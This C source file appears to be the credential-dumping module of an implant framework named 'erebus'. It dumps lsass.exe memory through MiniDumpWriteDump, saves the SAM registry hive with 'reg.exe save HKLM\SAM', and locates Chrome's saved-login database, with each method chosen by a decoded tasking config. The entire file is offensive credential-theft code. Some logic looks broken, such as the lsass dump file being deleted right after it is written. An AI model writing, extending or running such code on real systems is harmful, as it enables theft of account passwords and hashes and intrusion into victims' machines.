#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/mod_util.h"
#include "erebus/modules.h"
#include "erebus/pb_modules.h"

typedef BOOL (WINAPI *MiniDumpWriteDumpFn)(HANDLE, DWORD, HANDLE, DWORD, PVOID, PVOID, PVOID);

static int dump_lsass(uint32_t pid, erebus_credential *cred) {
    if (!pid) pid = erebus_mod_find_pid("lsass.exe");
    if (!pid) return 0;

    HANDLE hproc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hproc) return 0;

    char tmp[MAX_PATH];
    GetTempPathA(sizeof(tmp), tmp);
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%sdump-%u.bin", tmp, pid);

    HANDLE hfile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hfile == INVALID_HANDLE_VALUE) { CloseHandle(hproc); return 0; }

    HMODULE dbg = LoadLibraryA("dbghelp.dll");
    int ok = 0;
    if (dbg) {
        MiniDumpWriteDumpFn fn = (MiniDumpWriteDumpFn)GetProcAddress(dbg, "MiniDumpWriteDump");
        if (fn && fn(hproc, pid, hfile, 0x2, NULL, NULL, NULL)) {
            DWORD size = GetFileSize(hfile, NULL);
            snprintf(cred->type, sizeof(cred->type), "minidump");
            snprintf(cred->source, sizeof(cred->source), "lsass.exe (PID %u)", pid);
            snprintf(cred->value, sizeof(cred->value),
                "raw dump: %lu bytes (parse offline with pypykatz)", (unsigned long)size);
            ok = 1;
        }
        FreeLibrary(dbg);
    }
    CloseHandle(hfile);
    CloseHandle(hproc);
    DeleteFileA(path);
    return ok;
}

static int dump_sam(erebus_credential *cred) {
    char cmd[] = "reg.exe save HKLM\\SAM %TEMP%\\sam.save /y";
    char *so = NULL, *se = NULL;
    int32_t code = 1;
    int ok = erebus_mod_run_cmd(cmd, &so, &se, &code) && code == 0;
    if (ok) {
        snprintf(cred->type, sizeof(cred->type), "sam_hive");
        snprintf(cred->source, sizeof(cred->source), "HKLM\\SAM");
        strncpy(cred->value, "saved to %TEMP%\\sam.save (parse offline)", sizeof(cred->value) - 1);
    }
    free(so); free(se);
    return ok;
}

static int dump_browser(erebus_credential *cred) {
    char path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path) != S_OK) return 0;
    char login[MAX_PATH];
    snprintf(login, sizeof(login), "%s\\Google\\Chrome\\User Data\\Default\\Login Data", path);
    if (GetFileAttributesA(login) == INVALID_FILE_ATTRIBUTES) return 0;
    snprintf(cred->type, sizeof(cred->type), "browser_db");
    snprintf(cred->source, sizeof(cred->source), "%s", login);
    strncpy(cred->value, "Chrome Login Data found (decrypt offline)", sizeof(cred->value) - 1);
    return 1;
}

int erebus_mod_creds_dump(const uint8_t *config, size_t config_len, uint8_t **out, size_t *out_len) {
    erebus_cred_dump_config cfg;
    if (!erebus_pb_decode_cred_dump_config(config, config_len, &cfg)) return 0;

    erebus_credential cred;
    memset(&cred, 0, sizeof(cred));
    int ok = 0;

    if (strcmp(cfg.method, "lsass") == 0) {
        ok = dump_lsass(cfg.target_pid, &cred);
    } else if (strcmp(cfg.method, "sam") == 0) {
        ok = dump_sam(&cred);
    } else if (strcmp(cfg.method, "browser") == 0) {
        ok = dump_browser(&cred);
    } else {
        return 0;
    }

    if (!ok) return 0;
    return erebus_pb_encode_cred_dump_result(cfg.method, &cred, 1, out, out_len);
}